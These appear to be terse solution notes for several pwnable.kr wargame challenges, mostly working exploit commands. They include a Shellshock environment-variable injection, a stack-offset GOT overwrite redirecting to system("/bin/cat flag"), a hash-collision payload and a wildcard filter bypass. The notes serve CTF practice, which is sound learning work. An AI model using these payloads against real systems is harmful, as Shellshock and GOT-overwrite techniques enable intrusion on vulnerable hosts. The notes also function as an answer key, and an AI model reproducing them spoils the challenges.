# Pwnable.kr
### fd
./fd `python -c "print 0x1234+1"`
LETMEWIN
mommy! I think I know what a file descriptor is!!

### col

gdb col

col in gdb command:
disassemble check_password
b *0x080484bb
r
r AAAABBBBCCCCDDDDEEEE
info register
c
info register

python 
hex(0x21DD09EC  - (0x01010101 * 4))
0x1dd905e8

./col `python -c "print '\x01\x01\x01\x01'*4+'\xe8\x05\xd9\x1d'"`

daddy! I just managed to create a hash collision :)

### shellshock
env x='() { return;}; /bin/cat flag' ./shellshock }'' }'

### passcode
找到兩個scanf在stack的offset

"(ebp – 0x10) – (ebp – 0x70) = 0x60 = 96"

第一個scanf參數位置0xbffff3c8
第二個scanf參數位置0xbffff428

把剛剛取得的printf或fflush GOT位置寫入(%s)
再把system("/bin/cat flag")位置寫入(%d)

"0x80485E3 -> 134514147"
最後送出Payload是
"python -c "print 'A'*96+'\x00\xa0\x04\x08'+'134514147\n'" | ./passcode"

### cmd1
./cmd1 "/bin/cat f*"
